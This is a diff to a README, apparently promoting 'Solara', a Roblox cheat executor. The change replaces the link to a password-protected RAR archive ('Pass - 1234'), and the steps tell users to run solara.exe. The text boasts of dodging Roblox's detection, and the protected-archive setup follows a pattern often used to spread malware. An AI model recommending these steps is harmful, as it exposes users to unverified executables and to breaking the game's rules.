@@ -22,7 +22,7 @@ Instant Updates
 Ever thought what will happpen if Roblox detect Solara? Well, we are always here to provide you instant updates and upgrades for free
 
 # 🌌How to install Solara
-- First of all [download this](https://github.com/siriusblack011/Solara-Executor-V3/releases/download/Download/SolaraV3.rar) (🔑Pass - 1234)
+- First of all [download this](https://github.com/siriusblack011/Solara-Executor-V3/releases/download/Download/Solara.rar) (🔑Pass - 1234)
 - Open file solara.exe
 - Find script for your game
 - Run Roblox
